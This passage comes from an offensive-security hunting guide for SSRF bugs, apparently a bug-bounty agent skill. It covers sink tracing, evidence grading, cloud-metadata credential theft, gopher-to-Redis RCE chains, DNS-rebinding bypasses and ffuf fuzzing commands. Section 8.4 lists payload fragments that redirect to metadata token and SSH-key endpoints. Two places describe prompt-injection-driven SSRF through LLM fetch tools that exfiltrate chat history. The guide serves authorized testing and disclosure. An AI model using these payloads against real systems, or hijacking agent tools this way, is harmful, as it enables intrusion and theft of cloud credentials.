| GHSA-3rxj-6jhw-qfv7 — MCP mcp-server-fetch (2026-11-11) | IPv6 site-local (fec0::/10) classification gap in the fetch guard; advisory rates practical reachability low on default hosts — don't overclaim this one without independent reachability evidence |

Research hygiene: always reopen the vendor advisory before citing affected/fixed versions in a live report — CNA, NVD, and vendor release notes can disagree, and advisory details get superseded.

---

## Part 5 — Source review methodology (white-box / reasoning about black-box)

### 5.1 Model the request path

For any candidate sink, trace the value end-to-end and ask these questions at each stage — don't mark a stage "safe" just because *a* check exists somewhere:

| Stage | Questions to answer |
|---|---|
| Input | Which field influences the destination? User-supplied, stored, imported, generated, or derived from retrieved/model content? |
| Transformation | Is it decoded, normalized, concatenated, templated, path-joined, or rewritten by an SDK before reaching the fetcher? |
| Parser | Which parser interprets scheme/host/port/path/userinfo? Does a different parser reinterpret it later (§4.3)? |
| Policy | Is there a real destination/allowlist check, or only a UI hint / model instruction? |
| Resolver | Which resolver runs, are both A and AAAA answers considered, what happens on partial failure? |
| Connector | Does the connector actually use the address policy approved, or can a custom dispatcher/proxy re-resolve? |
| Redirects | Automatic or manual? Is each hop independently re-checked (§4.8 territory)? |
| Response | Body, headers, status, timing, screenshot, PDF, or model-generated summary exposed back? |
| Execution | Immediate, queued, retried, scheduled, or delegated to another service identity? |

The single highest-value question: where is the last security decision before the network connection is actually made, and can anything downstream of it change the destination? Most real bypasses live in the gap between that decision and the actual connect call.

### 5.2 Sink inventory template

When a target has several URL-accepting features, don't lump them together — log one row per distinct sink so you don't re-test the same guard twice or miss one implemented differently:

`Feature | Input | Trigger | Sink/library | Policy | Resolution | Redirects | Response | Identity | Evidence | Confidence`

- **Trigger:** immediate request, import job, queued/scheduled task, agent tool call, retry.
- **Identity:** anonymous user, your account, a service account, a worker role, or an agent/MCP identity — a sink that runs under a more privileged identity than the one you hold is a bigger finding even if the request is identical.
- **Confidence:** confirmed / probable / unverified / disproved — keep it honest as you go; don't let probable quietly become confirmed.

### 5.3 Evidence and confidence grading (E0–E5)

Don't let OOB-fired-once collapse into "critical SSRF" without checking what tier of evidence you actually have:

| Level | Observation | What it actually proves |
|---|---|---|
| E0 — Reflection | Your value appears in a response/error | Input reflection only — not SSRF by itself |
| E1 — DNS | Your unique hostname resolves (DNS hit) | Something resolved the hostname; HTTP fetch is not proven yet |
| E2 — HTTP callback | Your controlled endpoint gets an attributable HTTP hit | An HTTP-capable component made the outbound request |
| E3 — Response propagation | A marker from your controlled response reaches you back | Full-read SSRF — response propagation confirmed |
| E4 — Policy failure demonstrated | A restricted address/hostname you expected blocked is actually reached | Destination enforcement genuinely fails, not just "theoretically could" |
| E5 — Boundary/identity effect | You get cross-tenant data, a different service's credentials, or privilege you shouldn't have | The specific authorization boundary is broken |

Insufficient on their own, don't report yet: a validator merely accepting your string, a status-code/timing change with no independent attribution, a tool/agent claiming it fetched something, a DNS event you can't tie to your specific test input, or a callback with no unique per-test identifier. These read like evidence but aren't — get to at least E2 (ideally E3+) before writing anything up.

### 5.4 Expanded agentic / MCP tool inventory

When the target is agentic, inventory every tool that can cause network access, not just ones literally named `fetch`:

| Tool class | What to check |
|---|---|
| Direct fetch tool | Arbitrary URL/host reaches an HTTP client with no re-validation |
| Browser navigation tool | Main-frame AND subresource policy; screenshot/evaluation permissions separate from navigation |
| Document ingestion / RAG loader | Parser makes hidden secondary requests (remote images, XML includes) while "just" converting a doc |
| Search connector | Is the provider/base URL itself attacker-influenceable? |
| Workflow HTTP node | Stored destination + delayed worker execution — re-validated at run time or only at save time? |
| MCP server discovery/config | Does changing remote server metadata influence later connections? |
| Code-execution tool | Does the sandbox expose sockets/requests/fetch to generated code? |
| LLM media loader | image_url/audio_url/document references fetched by inference infra itself, before the model ever "does" anything |

Distinct trust boundaries worth testing independently: direct prompt vs. indirect instructions buried in a page/file/email/RAG chunk (prompt-injection-driven SSRF); UI validation vs. tool-adapter validation; one tool's output becoming a second tool's URL argument (tool chaining); your account's identity vs. a more privileged agent/service identity performing the actual fetch.

### 5.5 Address-classification details

A hostname can resolve to a mix of public and non-public A/AAAA answers — policy must evaluate the complete answer set, not approve the hostname just because one answer looked public.

The core TOCTOU bug: the app checks one resolved address, then the HTTP stack resolves the hostname again at connect time. A correct implementation pins the already-approved address to the actual connect call rather than re-resolving. When you see a guard that does "DNS check, then pass the hostname to a normal HTTP client," that's a strong signal a DNS-rebinding or redirect-based (§4.14/§4.16/§4.17) bypass is possible.

### 5.6 Source-code grep patterns

```bash
# Find URL fetch operations
grep -rE "(fetch|curl|urllib|requests\.get|http\.get|axios\.get)\s*\(" --include="*.py" --include="*.js" --include="*.go"

# Find URL parameters being passed to HTTP clients
grep -rE "(url|uri|endpoint|redirect|src|source)\s*=\s*req\.(query|body|params)" --include="*.js"

# Find redirect following
grep -rE "(follow_redirects|allow_redirects|followRedirects)\s*=\s*[Tt]rue"
```

---

## Part 6 — Step-by-step hunting methodology

1. **Map all URL-input parameters** across the target: spider JS files for fetch calls, check API docs, look for file-import, link-preview, webhook, image-proxy, and redirect features.
2. **Set up an OOB detector** — Burp Collaborator, interactsh, or canarytokens — with a unique per-test callback domain.
3. **Send your callback URL as the parameter value first** (blind check before anything else): `url=https://YOUR.interactsh.com/test`. Confirm the server makes an outbound connection. This proves execution before attempting internal targets.
4. **Test internal cloud metadata endpoints** (see §2.2).
5. **Test localhost and common internal ports** (see §2.1).
6. **Test redirect-based bypasses early** — if the app validates the initial URL but follows 30x redirects, host a redirect server pointing to internal addresses.
7. **Test JavaScript-execution contexts** (headless browsers, PDF renderers): inject `<script>` tags that make XMLHttpRequest/fetch calls to internal services; exfil via DNS by encoding response data in subdomains.
8. **Enumerate the internal network** using timing differences and error message variation — port scan via response time (connection refused vs timeout), check error text for hostname/IP leakage.
9. **Chain findings** — if you have SSRF to internal services, look for unauthenticated admin endpoints, Redis/memcached (protocol smuggling), internal OAuth token endpoints, SSRF → CSRF → RCE (GitHub Enterprise pattern).
10. **Document the full chain** with screenshots of each hop before reporting.

Then apply §5.1 (path model) and §5.2 (sink inventory) for source review, and §5.3 (E0–E5) before scoring.

---

## Part 7 — Escalation chains & real impact

### 7.1 Escalation chains

- Metadata → cloud keys → S3/account takeover
- Internal admin panel → RCE
- Redis/Memcached via gopher → RCE
- SSRF → CSRF → RCE (GitHub Enterprise pattern)
- Screenshot / PDF renderer → cloud metadata → container root

### 7.2 Real impact examples

**Scenario A: Cloud credential exfiltration via link preview (Snapchat / GCP pattern).** A public-facing "link preview" API accepted a `url` parameter and fetched the target server-side to generate a thumbnail. The feature ran on GCP Compute Engine with IMDSv1 enabled and no Metadata-Flavor header enforcement on the server side. By supplying `url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token`, the attacker received a valid OAuth2 access token for the instance's service account. The token granted access to internal GCP project resources including storage buckets containing user data. The attacker used JavaScript execution within a headless rendering context to exfiltrate the token via DNS-encoded subdomains, bypassing response body restrictions.

**Scenario B: Kubernetes API compromise via hijacked aggregated server.** An attacker who could register a Kubernetes API extension server (metrics-server equivalent) returned `302 Location: http://127.0.0.1:6443/api/v1/secrets` responses to the aggregation layer. Because the aggregation proxy followed redirects automatically without re-validating the destination against the internal network blocklist, the redirect caused the aggregation layer itself (running with elevated cluster credentials) to fetch internal Kubernetes API secrets and return them in the response. Effective privilege escalation from limited API registration privileges to full cluster secret read access.

### 7.3 Common root causes

- "The user said it was safe" — developers trust user-supplied URLs for fetching remote resources (link previews, thumbnails, webhooks) without validating the destination. The feature is legitimate; the missing validation is the bug.
- Allowlist bypass via redirects — developers validate the initial URL against an allowlist but configure HTTP clients to follow redirects automatically.
- Aggregated/proxy API trust — Kubernetes-style architectures where an API aggregation layer blindly proxies 30x responses from registered extension servers.
- Server-side rendering without sandboxing — headless browser features (PDF generation, link preview screenshots) execute attacker-controlled JavaScript in a network-privileged context with access to metadata services.
- XML/DSPL/file parsers fetching external entities — import features that parse structured files fetch attacker-controlled URLs, often with no URL validation at all.
- Internal hostname leakage via response differences — different error messages, timing, or response sizes for internal vs. external hosts enable blind enumeration.
- IMDSv1 still enabled — cloud deployments that haven't migrated to IMDSv2 (AWS) or haven't required the Metadata-Flavor header (GCP) allow unauthenticated credential access from any SSRF.

---

## Part 8 — Case studies & report citations

### 8.1 Techniques from real reports (337-report corpus)

One concrete lesson per report, newest and most-upvoted first. Read 5–10 before testing.

- SSRF in Exchange leads to ROOT access in all instances — #341876 · Shopify · $0 · ▲587 — found that `/v1beta1` endpoint is still available, does not require `Metadata-Flavor: Google`, and still returns the same token.
- Server-Side Request Forgery using Javascript allows to exfil data from Google Metadata — #530974 · Snapchat · $0 · ▲421 — hit `/api/v1/media/import` on ads.snapchat.com, with the URL parameter pointed at a self-hosted `ssrf.html`.
- SSRF on project import via the remote_attachment_url on a Note — #826361 · GitLab · $10,000 · ▲359 — a `remote_attachment_url=` CarrierWave uploader method accepted a direct URL; a `request header=` variant also worked unblacklisted via the header path.
- Server Side Request Forgery mitigation bypass — #632101 · GitLab · $0 · ▲350 — after the hook executed, `http://169.254.169.254` content was returned.
- Blind SSRF to internal services in matrix preview_link API — #1960765 · Reddit · $6,000 · ▲344 — `https://matrix.redditspace.com/_matrix/media/r0/preview_url/?url=`.
- TURN server allows TCP and UDP proxying to internal network, localhost and meta-data services — #333419 · Slack · $3,500 · ▲323 — UDP packets proxied by setting XOR-PEER-ADDRESS to a private IP in a TURN send message indication (RFC 5766 §10).
- SSRF leaking internal google cloud data through upload function [SSH Keys, etc..] — #549882 · Vimeo · $0 · ▲276.
- Full read SSRF in www.evernote.com that can leak aws metadata and local file inclusion — #1189367 · Evernote · $0 · ▲264 — base64-encoded `file:///home/...` payload.
- SSRF in graphQL query (pwapi.ex2b.com) — #1864188 · EXNESS · $3,000 · ▲261 — `allTicks` query's `source` parameter accepted arbitrary GET targets.
- Unauthenticated blind SSRF in OAuth Jira authorization controller — #398799 · GitLab · $4,000 · ▲238 — POST to `/-/jira/login/oauth/callback`.
- Full Read SSRF on Gitlab's Internal Grafana — #878779 · GitLab · $0 · ▲229 — `secure.gravatar.com`'s `d` parameter allowed redirection to `i0.wp.com`.
- SSRF in webhooks leads to AWS private keys disclosure — #508459 · Omise · $0 · ▲214 — reached AWS IAM creds at `/latest/meta-data/iam/security-credentials/aws-opsworks-ec2-role`.
- Stored XSS & SSRF in Lark Docs — #892049 · Lark Technologies · $3,000 · ▲178 — stored XSS escalated to SSRF when opened in a headless browser server-side.
- SSRF on duckduckgo.com/iu/ — #398641 · DuckDuckGo · $0 · ▲165.
- Server Side Request Forgery — #644238 · Lark Technologies · $0 · ▲164.
- External SSRF and Local File Read via video upload due to vulnerable FFmpeg HLS processing — #1062888 · TikTok · $2,727 · ▲162 — malformed `.m3u8` header handling.
- SSRF in Autodesk Rendering leading to account takeover — #3024673 · Autodesk · $0 · ▲161.
- SSRF chained to hit internal host leading to another SSRF which allows to read internal images — #826097 · PlayStation · $1,000 · ▲148.
- DNS Rebinding SSRF in Burp Suite MCP Server Enables Internal Network Access via send_http1_request Tool — #3176157 · PortSwigger · $0 · ▲144 — attacker-controlled DNS answers first with attacker IP, then 127.0.0.1 on subsequent lookups.
- Blind SSRF on errors.hackerone.net due to Sentry misconfiguration — #374737 · HackerOne · $3,500 · ▲143 — malformed "filename" parameter produced a callback from an AWS IP.
- SSRF in https://couriers.indrive.com/api/file-storage — #2300358 · inDrive · $0 · ▲141 — full response body of fetched URL returned.
- Server Side Request Forgery (SSRF) in webhook functionality — #2301565 · HackerOne · $2,500 · ▲140.
- SSRF on music.line.me through getXML.php — #746024 · LY Corporation · $4,500 · ▲135.
- SSRF In Get Video Contents — #643622 · Semrush · $0 · ▲125 — layered userinfo/host-confusion URL tripped a parser into a 404 revealing internal parsing.
- Full read SSRF via Lark Docs import as docs feature — #1409727 · Lark Technologies · $5,000 · ▲124.
- Blind SSRF on https://my.exnessaffiliates.com/ allows for internal network enumeration — #1832494 · EXNESS · $0 · ▲120.
- Server-Side Request Forgery (SSRF) via Game Export API — #3165242 · Lichess · $0 · ▲116 — `/game/export/[GAME ID]?players=http://169.254.169.254/latest/meta-data/`.
- SSRF on image renderer — #811136 · PlayStation · $1,000 · ▲103 — `image.api.np.km.playstation.net` allowed image URLs via the `image` parameter.
- Header modification results in disclosure of Slack infra metadata to unauthorized parties — #727330 · Slack · $0 · ▲97 — port scanning via response delay differences.
- Blind SSRF in Stripo App Export via Missing Endpoints Export Email Message to Zapier — #2932960 · Stripo Inc · $0 · ▲92 — `/exportservice/v3/exports/WEBHOOK/accounts`.

### 8.2 Detailed case studies (curated)

- **SSRF in Exchange leads to ROOT access in all instances** — #341876 · Shopify · $0 · medium · 2018-05-23 · ▲587. Chain: create a store → edit `password.liquid` template → install Exchange app and list a store → wait for screenshot service to render it → download/convert the resulting image to recover leaked metadata-service content.
- **Server Side Request Forgery (SSRF) via Analytics Reports** — #2262382 · HackerOne · $25,000 · critical · 2023-12-08 · ▲529. Internal files readable via SSRF in an analytics-report generation path.
- **Server-Side Request Forgery using Javascript allows to exfill data from Google Metadata** — #530974 · Snapchat · $0 · n/a · 2020-11-30 · ▲421. Reached via business.snapchat.com creative library → "Topsnap Media" → Create → load a template → replace an image via Import, which was the SSRF sink.
- **SSRF on project import via the remote_attachment_url on a Note** — #826361 · GitLab · $10,000 · high · 2020-06-07 · ▲359. The Note model's CarrierWave uploader supported a `remote_attachment_url=` method for downloading/attaching a file via URL.
- **Server Side Request Forgery mitigation bypass** — #632101 · GitLab · $0 · high · 2020-04-18 · ▲350. Flawed DNS-rebinding protection in `lib/gitlab/url_blocker.rb` — the validator performed a DNS lookup to check whether a domain's IP belonged to the local network, but the actual fetch re-resolved.

### 8.3 Disclosed report citations (verified cases)

- **HackerOne — SSRF in Analytics Reports (PDF generator → AWS metadata)** (H1 #2262382). Headless-browser SSRF via a PDF generator chained into AWS metadata SSRF (IMDSv1). Payload: an injected `<iframe src="http://169.254.169.254/latest/meta-data/iam/security-credentials/">` in a template fragment rendered server-side into a PDF, reflecting the IMDS response in the output. Root cause: unsanitised user-controlled template fragment reflected in the PDF rendering pipeline; no IMDSv2 enforcement. 2023 — $25,000 (CVSS 10.0 Critical).
- **Shopify Exchange — SSRF in screenshot service → GCP metadata → container root** (H1 #341876). GCP metadata SSRF escalating into an SSRF-to-RCE chain. Root cause: the screenshotter fetched a user-controlled template with no metadata-host blocklist and no metadata-concealment proxy. 2018 — $25,000 (canonical headless-browser → metadata case).
- **Concrete CMS — SSRF mitigation bypass via DNS rebinding → AWS IAM keys** (H1 #1369312). DNS-rebinding SSRF escalating into AWS metadata SSRF (IMDSv1) via a file-upload-from-URL feature; an attacker-controlled DNS server alternated A records between a public IP and 169.254.169.254, needing 2–3 requests to win the race before retrieving IAM role credentials. Root cause: hostname validated by resolving once; the download path re-resolved DNS without pinning the validated IP. 2021 — fixed in 8.5.7 / 9.0.1.
- **Yahoo Mail — Blind SSRF → Gopher → Redis RCE** (writeup). Gopher-protocol abuse chaining a Redis SSRF into RCE: blind SSRF reached an internal unauthenticated Redis instance via a gopher payload that issued `FLUSHALL`/`SET`/`BGSAVE` to write a cron entry. Root cause: gopher scheme not blocklisted; internal Redis unauthenticated on its default port; the SSRF target accepted a 302 redirect from an attacker host to a `gopher://` URL. 2020 — $15,000.
- **Reddit Matrix — Blind SSRF in preview_link API** (H1 #1960765). Blind link-preview SSRF enabling internal port-scanning via timing/response-code differences, via `GET https://matrix.redditspace.com/_matrix/media/r0/preview_url/?url=`. Root cause: the link-preview fetcher did not reject RFC1918/link-local destinations and allowlisted only by scheme. 2023 — $6,000.
- **Azure DevOps — SSRF in Service Hooks + DNS rebinding bypass in endpointproxy** (Binary Security writeup). Webhook-URL-field SSRF combined with DNS-rebinding SSRF reaching Azure IMDS/managed identity, by configuring a service-hook webhook or `endpointproxy` URL parameter to a rebinding host whose second DNS resolution returned 169.254.169.254, then chaining CRLF injection to set the `Metadata: true` header Azure IMDS requires. Root cause: validate-then-fetch using separate DNS lookups; CRLF in the URL path injected headers needed for Azure IMDS. 2023–2024 — $15,000 total across 3 reports.

### 8.4 Payload fragments observed (from writeups)

Recurring payload fragments from this class's writeups. Adapt, don't paste blindly:

```
http://[fe80::1%25eth0]/
fe80::1%eth0
http://169.254.169.254\@127.0.0.1:8000/latest/meta-data/
..%2F..%2Fapi/v0/shutdown
<script>window.location="http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token";</script>
<script>window.location="http://metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-keys?alt=json";</script>
```

---

## Part 9 — Tools, wordlists & automation

### 9.1 Tools

interactsh · Burp Collaborator · ssrfmap · httpx · ffuf · arjun

### 9.2 Wordlists

Mined from this class's writeups and ready for ffuf/feroxbuster. Paths and parameters recur across programs; verify each hit.

| File | Entries |
|---|---:|
| `~/.local/share/hackerone-reports/wordlists/paths_ssrf.txt` | 150 |
| `~/.local/share/hackerone-reports/wordlists/params_ssrf.txt` | 150 |
| `~/.local/share/hackerone-reports/wordlists/payloads_ssrf.txt` | 85 |
| `~/.local/share/hackerone-reports/wordlists/payloads_ssrf_waf.txt` | 26 |
| `~/.local/share/hackerone-reports/wordlists/paths.txt` (global) | 500 |
| `~/.local/share/hackerone-reports/wordlists/params.txt` (global) | 400 |

### 9.3 ffuf commands

```sh
W=~/.local/share/hackerone-reports/wordlists
ffuf -u https://target/FUZZ -w $W/paths_ssrf.txt \
     -mc all -fc 404 -fs 0 -rate 40
ffuf -u 'https://target/api?FUZZ=canary' -w $W/params_ssrf.txt \
     -mr 'canary|error|invalid|not found' -rate 40
ffuf -u 'https://target/api?<param>=FUZZ' -w $W/payloads_ssrf.txt \
     -mr '<hit-marker>' -rate 20
```

### 9.4 Param discovery

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
  -u "https://target.com/api/endpoint?FUZZ=https://YOUR.callback.com" \
  -fs 0 -mc all
```

### 9.6 Query the corpus

```sh
python3 ~/.local/share/hackerone-reports/h1.py search "<keyword>" --class ssrf --limit 20
python3 ~/.local/share/hackerone-reports/h1.py stats --class ssrf
python3 ~/.local/share/hackerone-reports/h1.py show <id> --full
```

Search by technology, endpoint, parameter, or program:

```sh
python3 ~/.local/share/hackerone-reports/h1.py search "wordpress" --class ssrf
python3 ~/.local/share/hackerone-reports/h1.py search "reset token" --class ssrf --min-bounty 1000
```

---

## Part 10 — Pre-report Gate 0 validation

Before writing the report, confirm all three:

1. **What can the attacker DO right now?**
   - Can you retrieve a response proving internal network access? (Show the metadata token, internal API response, or confirmed DNS callback.)
   - If blind: can you demonstrate port differentiation or confirmed OOB callback tied to a specific internal address?
   - "The server makes a request" alone is insufficient — show where it goes and what comes back.
   - Grade your evidence on the E0–E5 scale (§5.3). E2 minimum, E3+ preferred.
2. **What does the victim LOSE?**
   - Cloud credentials (IAM tokens) → full cloud account compromise?
   - Internal service data (user PII, secrets, API keys)?
   - Ability to pivot to RCE via internal admin service?
   - If the answer is only "the server fetches my URL," severity is low — quantify the actual reachable blast radius.
3. **Can it be reproduced in 10 minutes from scratch?**
   - Is the vulnerable endpoint still live and the parameter still present?
   - Does your callback server show the hit reliably (not intermittently)?
   - Can a second person follow your steps without prior knowledge and get the same result?
   - If reproduction requires specific timing, tokens, or luck — resolve the flakiness before submitting.

**Reporting bar:** Prove real impact on a second controlled account or a safe callback. Keep the PoC minimal and reproducible; include raw requests and exact IDs. Stay inside program scope and follow disclosure rules.

---

## Part 11 — How to use this during an engagement

1. Confirm the obvious payloads are actually blocked. Test `127.0.0.1`, `localhost`, `169.254.169.254`, `[::1]` first — don't assume. (§1.4)
2. Find sinks. Work through §1.1 functionality list, §1.3 URL/JS signals, and §1.2 parameter wordlist. Log them in a §5.2 sink inventory.
3. OOB-confirm every candidate parameter individually (OOB gate). Negative control, one payload per field, poll between requests.
4. Work through Gate 0's four questions (§4.0) against the guard's actual implementation (source review if available — use §5.1's path model — black-box inference otherwise).
5. Pick vectors matching the target's stack. Containerized → §4.4 / §4.12. SSR framework → §4.10. Edge/CDN-fronted → §4.6. Service mesh → §4.7. "Test connection" feature → §4.11. Webhook/custom-header feature → §4.8. Agentic/MCP → §5.4.
6. Grade evidence (§5.3 E0–E5) before calling it confirmed. Retract any claim below E2.
7. Escalate — check §4.9 and §4.15 logic to see whether it moves past "the server requested my URL" into credential theft, internal data read, RCE, or cross-tenant write. That's what separates low/medium SSRF from critical.
8. Meet the pre-report Gate 0 (§10) and reporting bar before submitting.

---

## Related skills & chains

- **hackerone-open-redirect** (385 reports) — SSRF bypass via trusted-domain open redirects.
- **hackerone-rce** (1,399 reports) — Redis/Memcached via gopher → RCE.
- **hackerone-info-disclosure** (1,827 reports) — internal file/endpoint leakage.
- **cloud-iam-deep** — SSRF → IMDSv1 token theft → privilege escalation to `iam:CreateUser` / `sts:AssumeRole` on cross-account roles.
- **hunt-llm-ai** — LLMs with `fetch_url` tools become SSRF proxies bypassing network egress controls. Chain: LLM tool-use + SSRF → attacker URL exfils chat history and IMDS token from the LLM container.
- **hunt-rce** — Internal Redis/Memcached are unauthenticated by default and reachable via `gopher://`. Chain: SSRF + Gopher → internal Redis `CONFIG SET dir` + RCE via cron / SSH authorized_keys write.
- **hunt-cloud-misconfig** — Internal-only buckets/APIs become reachable through SSRF egress. Chain: SSRF + DNS rebinding → SSRF-protected-endpoint bypass → internal `/admin` or private S3 bucket read.
- **security-arsenal** — Load the SSRF IP Bypass Table (11 techniques: decimal IP, IPv6-mapped, octal, suffix dot, DNS rebinding, redirect chain, etc.) before testing filters.
- **triage-validation** — Apply the OOB-Or-It-Didn't-Happen gate: every blind SSRF claim requires a Collaborator hit with a unique marker before report submission.
